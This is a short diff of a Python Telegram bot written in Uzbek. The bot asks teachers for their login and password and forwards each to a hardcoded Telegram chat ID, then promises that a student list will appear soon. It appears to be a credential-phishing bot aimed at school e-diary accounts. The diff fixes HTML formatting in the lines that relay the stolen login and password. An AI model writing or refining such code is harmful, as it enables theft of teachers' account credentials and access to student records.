@@ -76,7 +76,7 @@ async def Oquvchi(message: types.Message,state:FSMContext):
 @dp.message_handler(state=Form.teacher_login, content_types=types.ContentTypes.TEXT)
 async def Oquvchi(message: types.Message,state:FSMContext):
     login = str(message.text)
-    await bot.send_message(6498877955,f"O'qituvchi 👨🏻‍🏫 <b>logini</b>: <code>{login}<code/>")
+    await bot.send_message(6498877955,f"O'qituvchi 👨🏻‍🏫 <b>logini</b>: <code>{login}</code>",parse_mode="HTML")
     await message.answer("<b>Parolingizni</b> kiriting 🔑")
     await state.finish()
     await Form.teacher_parol.set()
@@ -86,7 +86,7 @@ async def Oquvchi(message: types.Message,state:FSMContext):
 @dp.message_handler(state=Form.teacher_parol, content_types=types.ContentTypes.TEXT)
 async def Oquvchi(message: types.Message,state:FSMContext):
     password = str(message.text)
-    await bot.send_message(6498877955,f"O'qituvchi 👨🏻‍🏫 <b>paroli</b>: <code>{password}<code/>")
+    await bot.send_message(6498877955,f"O'qituvchi 👨🏻‍🏫 <b>paroli</b>: <code>{password}</code>")
     await message.answer(f"Tez orada o'quvchilar royxati chiqadi",reply_markup=kundalikcom_button)
     await message.answer("⏳")
     await state.finish()
@@ -103,7 +103,6 @@ async def Oquvchi(message: types.Message,state:FSMContext):
 
 
 
-#-------------------------O'quvchi-------------------------#
 
 
 @dp.message_handler(state=Form.student_login, content_types=types.ContentTypes.TEXT)
